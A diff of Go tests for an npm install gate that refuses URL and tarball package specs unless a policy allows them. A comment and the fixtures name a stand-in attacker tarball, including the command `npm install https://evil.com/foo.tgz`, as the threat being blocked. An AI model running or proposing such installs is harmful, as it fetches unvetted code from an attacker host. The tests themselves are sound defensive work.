@@ -68,14 +68,71 @@ func TestEvaluateMaliciousInstallRefuses(t *testing.T) {
 	require.Equal(t, "evil", dec.Flagged()[0].Ref.Name)
 }
 
-func TestEvaluateLocalInstallAllowedUnderDefaultPolicy(t *testing.T) {
+func TestEvaluateLocalPathInstallAllowedUnderDefaultPolicy(t *testing.T) {
 	store := buildStore(t)
 	g := gate.New(store, gate.DefaultPolicy())
 	dec := g.Evaluate([]packagemanager.Install{
-		{Ref: intel.PackageRef{Ecosystem: intel.EcosystemNPM, Name: "./local"}, Local: true},
+		{Ref: intel.PackageRef{Ecosystem: intel.EcosystemNPM, Name: "./local"}, LocalPath: true},
 	})
 	require.Equal(t, gate.OutcomeAllow, dec.Outcome)
 	require.Empty(t, dec.Verdicts)
+}
+
+// TestEvaluateOpaqueRemoteRefusedByDefault is the core test for the
+// policy shift: URL/git/tarball specs that bypass the registry name
+// lookup must be refused by default. Otherwise an attacker can flag a
+// tarball URL in an upstream feed and we'd let `npm install
+// https://evil.com/foo.tgz` through unchecked.
+func TestEvaluateOpaqueRemoteRefusedByDefault(t *testing.T) {
+	store := buildStore(t)
+	g := gate.New(store, gate.DefaultPolicy())
+	dec := g.Evaluate([]packagemanager.Install{
+		{
+			Ref:          intel.PackageRef{Ecosystem: intel.EcosystemNPM, Name: "https://evil.com/x.tgz"},
+			RawSpec:      "https://evil.com/x.tgz",
+			OpaqueRemote: true,
+		},
+	})
+	require.Equal(t, gate.OutcomeRefuse, dec.Outcome)
+	require.Len(t, dec.Flagged(), 1)
+	require.Equal(t, "bouncer-policy", dec.Flagged()[0].Reports[0].SourceID)
+	require.Contains(t, dec.Flagged()[0].Reports[0].Reason, "BOUNCER_ALLOW_OPAQUE")
+}
+
+// TestEvaluateOpaqueRemoteAllowedWithPolicy: opting in via policy flips
+// opaque refusal back into passthrough, but the install still gets no
+// intel lookup (no name to look up against).
+func TestEvaluateOpaqueRemoteAllowedWithPolicy(t *testing.T) {
+	store := buildStore(t)
+	policy := gate.DefaultPolicy()
+	policy.AllowOpaqueRemote = true
+	g := gate.New(store, policy)
+	dec := g.Evaluate([]packagemanager.Install{
+		{
+			Ref:          intel.PackageRef{Ecosystem: intel.EcosystemNPM, Name: "https://example.com/x.tgz"},
+			RawSpec:      "https://example.com/x.tgz",
+			OpaqueRemote: true,
+		},
+	})
+	require.Equal(t, gate.OutcomeAllow, dec.Outcome)
+	require.Empty(t, dec.Verdicts)
+}
+
+// TestEvaluateLocalPathRefusedUnderStrictPolicy: callers who want the
+// strictest possible mode can flip AllowLocalPath off too. Verifies the
+// gate produces a clearly-distinct refusal (different reason string)
+// from the opaque-remote case.
+func TestEvaluateLocalPathRefusedUnderStrictPolicy(t *testing.T) {
+	store := buildStore(t)
+	policy := gate.DefaultPolicy()
+	policy.AllowLocalPath = false
+	g := gate.New(store, policy)
+	dec := g.Evaluate([]packagemanager.Install{
+		{Ref: intel.PackageRef{Ecosystem: intel.EcosystemNPM, Name: "./local"}, LocalPath: true},
+	})
+	require.Equal(t, gate.OutcomeRefuse, dec.Outcome)
+	require.Equal(t, "bouncer-policy", dec.Flagged()[0].Reports[0].SourceID)
+	require.Contains(t, dec.Flagged()[0].Reports[0].Reason, "local-path")
 }
 
 func TestEvaluateEmptyInstallsAllow(t *testing.T) {
